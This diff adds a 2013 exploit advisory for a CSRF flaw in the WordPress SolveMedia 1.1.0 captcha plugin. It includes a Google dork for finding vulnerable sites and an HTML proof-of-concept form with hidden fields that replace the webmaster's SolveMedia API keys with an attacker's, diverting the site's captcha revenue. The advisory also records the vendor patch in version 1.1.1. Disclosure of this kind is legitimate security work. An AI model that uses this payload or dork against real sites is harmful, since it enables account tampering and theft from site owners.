@@ -1,0 +1,35 @@
+# Exploit Title: WordPress SolveMedia 1.1.0 CSRF Vulnerability
+# Release Date: 24/01/13
+# Author: Junaid Hussain - [ illSecure Research Group ] -
+# Contact: illSecResearchGroup@Gmail.com | Website: http://illSecure.com
+# Software Link: http://downloads.wordpress.org/plugin/solvemedia.1.1.0.zip
+# Vendor Homepage: http://solvemedia.com
+# Tested on: CentOs 5
+# Google Dork: inurl:wp-content/plugins/solvemedia
+-----------------------------------------------------------------------------------------------------------------------
+//##### Introduction: 
+SolveMedia is a capatcha service that allows webmasters to monetize
+from correct captcha type-ins, solvemedia.admin.inc is vulnerable to CSRF,
+there is no anti-CSRF tokens implemented nor is the wp-nonce function used,
+therefore an attacker can change the webmasters SolveMedia API Keys (public key, 
+private key, hash key) to the attackers own set of API keys thus stealing
+the webmasters SolveMedia revenue.
+-------------------------------------------------------------------------------------------------------------------------
+//##### CSRF - Proof Of Concept:
+<html>
+<form  method="post" action="http://server/wp-admin/plugins.php?page=solvemedia/solvemedia.admin.inc&updated=true">
+<input name="adcopy_opt_pubkey" id="adcopy_opt_pubkey" size="40" value="[ ATTACKERS PUBLIC KEY ]" style="display:none;"/>                       
+<input name="adcopy_opt_privkey" id="adcopy_opt_privkey" size="40" value="[ ATTACKERS PRIVATE KEY ]" style="display:none;"/>
+<input name="adcopy_opt_hashkey" id="adcopy_opt_hashkey" size="40" value="[ ATTACKERS HASH KEY ]" style="display:none;" />
+<input type="submit" name="submit" value="Enter" />	
+</form>
+</html>
+\\##### End Poc #####
+-------------------------------------------------------------------------------------------------------------------------
+//##### Patch:
+-- Vendor was notified on the 22/01/2013
+-- Vendor released version 1.1.1 on 23/01/2013 which included a patch
+--- Patched Version (1.1.1): http://wordpress.org/extend/plugins/solvemedia/
+--- ChangeLog: http://wordpress.org/extend/plugins/solvemedia/changelog/
+-------------------------------------------------------------------------------------------------------------------------
+//##### Original: http://illSecure.com/code/Wordpress-SolveMedia-CSRF-Vulnerability.txt
